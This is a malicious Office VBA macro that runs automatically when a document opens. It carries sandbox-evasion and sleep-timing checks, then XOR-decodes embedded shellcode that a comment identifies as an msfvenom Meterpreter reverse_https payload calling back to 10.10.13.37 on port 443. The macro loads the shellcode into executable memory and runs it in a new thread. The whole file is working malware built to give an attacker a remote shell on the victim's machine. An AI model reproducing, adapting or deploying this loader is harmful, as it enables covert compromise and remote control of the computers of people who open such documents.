Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr
Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
Private Declare PtrSafe Function Sleep Lib "kernel32" (ByVal mili As Long) As Long
Private Declare PtrSafe Function FlsAlloc Lib "kernel32" (ByVal lpCallback As LongPtr) As Long

Sub Document_Open()
  ShellcodeRunner
End Sub

Sub AutoOpen()
  ShellcodeRunner
End Sub

Function ShellcodeRunner()
  Dim sc As Variant
  Dim tmp As LongPtr
  Dim addr As LongPtr
  Dim counter As Long
  Dim data As Long
  Dim res As Long
  Dim dream As Integer
  Dim before As Date
  
  ' Check if we're in a sandbox by calling a rare-emulated API
  If IsNull(FlsAlloc(tmp)) Then
    Exit Function
  End If

  ' Sleep to evade in-memory scan + check if the emulator did not fast-forward through the sleep instruction
  dream = Int((1500 * Rnd) + 2000)
  before = Now()
  Sleep (dream)
  If DateDiff("s", t, Now()) < dream Then
    Exit Function
  End If
  
  Key = "a"

  ' msfvenom -p windows/meterpreter/reverse_https LHOST=10.10.13.37 LPORT=443 EXITFUNC=thread -f vbapplication --encrypt xor --encrypt-key a
  sc = Array(157, 137, 238, 97, 97, 97, 1, 80, 179, 5, 234, 51, 81, 234, 51, 109, 232, 132, 234, 51, 117, 80, 158, 110, 214, 43, 71, 234, 19, 73, 80, 161, 205, 93, 0, 29, 99, 77, 65, 160, 174, 108, 96, 166, 40, 20, 142, 51, 54, 234, 51, 113, 234, 35, 93, 96, 177, 234, 33, 25, 228, 161, 21, 45, 96, 177, 49, 234, 41, 121, 234, 57, 65, 96, 178, 228, 168, 21, 93, 80, 158, _
40, 234, 85, 234, 96, 183, 80, 161, 160, 174, 108, 205, 96, 166, 89, 129, 20, 149, 98, 28, 153, 90, 28, 69, 20, 129, 57, 234, 57, 69, 96, 178, 7, 234, 109, 42, 234, 57, 125, 96, 178, 234, 101, 234, 96, 177, 232, 37, 69, 69, 58, 58, 0, 56, 59, 48, 158, 129, 57, 62, 59, 234, 115, 136, 225, 158, 158, 158, 60, 9, 82, 83, 97, 97, 9, 22, 18, 83, 62, 53, _
9, 45, 22, 71, 102, 232, 137, 158, 177, 217, 241, 96, 97, 97, 72, 165, 53, 49, 9, 72, 225, 10, 97, 158, 180, 11, 107, 9, 161, 201, 83, 4, 9, 99, 97, 96, 218, 232, 135, 49, 49, 49, 49, 33, 49, 33, 49, 9, 139, 110, 190, 129, 158, 180, 246, 11, 113, 55, 54, 9, 248, 196, 21, 0, 158, 180, 228, 161, 21, 107, 158, 47, 105, 20, 141, 137, 6, 97, 97, 97, _
11, 97, 11, 101, 55, 54, 9, 99, 184, 169, 62, 158, 180, 226, 153, 97, 31, 87, 234, 87, 11, 33, 9, 97, 113, 97, 97, 55, 11, 97, 9, 57, 197, 50, 132, 158, 180, 242, 50, 11, 97, 55, 50, 54, 9, 99, 184, 169, 62, 158, 180, 226, 153, 97, 28, 73, 57, 9, 97, 33, 97, 97, 11, 97, 49, 9, 106, 78, 110, 81, 158, 180, 54, 9, 20, 15, 44, 0, 158, 180, _
63, 63, 158, 109, 69, 110, 228, 17, 158, 158, 158, 136, 250, 158, 158, 158, 96, 162, 72, 167, 20, 160, 162, 218, 129, 124, 75, 107, 9, 199, 244, 220, 252, 158, 180, 93, 103, 29, 107, 225, 154, 129, 20, 100, 218, 38, 114, 19, 14, 11, 97, 50, 158, 180)

  Dim scSize As Long
    scSize = UBound(sc)
    ' Decrypt shellcode
    Dim keyArrayTemp() As Byte
    keyArrayTemp = Key
    
    i = 0
    For x = 0 To UBound(sc)
        sc(x) = sc(x) Xor keyArrayTemp(i)
        i = (i + 2) Mod (Len(Key) * 2)
    Next x
    
    ' TODO set the SIZE here (use a size > to the shellcode size)
    Dim buf(685) As Byte
    For y = 0 To UBound(sc)
        buf(y) = sc(y)
    Next y

  ' &H3000 = 0x3000 = MEM_COMMIT | MEM_RESERVE
  ' &H40 = 0x40 = PAGE_EXECUTE_READWRITE
  addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)

  For counter = LBound(buf) To UBound(buf)
    data = buf(counter)
    res = RtlMoveMemory(addr + counter, data, 1)
  Next counter

  res = CreateThread(0, 0, addr, 0, 0, 0)
End Function
